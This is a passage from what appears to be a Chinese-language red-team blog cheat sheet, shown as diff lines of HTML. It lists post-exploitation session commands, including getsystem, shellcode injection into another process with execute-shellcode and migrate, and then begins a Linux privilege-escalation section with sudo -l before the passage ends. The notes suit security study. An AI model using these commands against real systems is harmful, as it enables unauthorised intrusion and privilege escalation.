+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>info <span style="color:#75715e">#查看会话信息</span>
+</span></span><span style="display:flex;"><span>ifconfig <span style="color:#75715e">#查看会话中网段信息</span>
+</span></span><span style="display:flex;"><span>whoami <span style="color:#75715e">#查看自己</span>
+</span></span><span style="display:flex;"><span>getprivs以及getsystem <span style="color:#75715e">#windows特供命令，不解释</span>
+</span></span><span style="display:flex;"><span>rename -name shell <span style="color:#75715e">#将当前会话重命名为shell</span>
+</span></span><span style="display:flex;"><span>execute-shellcode -p <span style="color:#f92672">[</span>pid<span style="color:#f92672">]</span> /home/wackymaker/test/1.bin <span style="color:#75715e">#执行shellcode，-p可以指定其他进程注入可以利用ps查看，用来上线msf很方便</span>
+</span></span><span style="display:flex;"><span>migrate -p <span style="color:#f92672">[</span>pid<span style="color:#f92672">]</span> <span style="color:#75715e">#指定载荷</span>
+</span></span></code></pre></div><h2 id="linux相关-2">linux相关
 </h2><h3 id="提权三件套">提权三件套
 </h3><p>sudo</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo -l
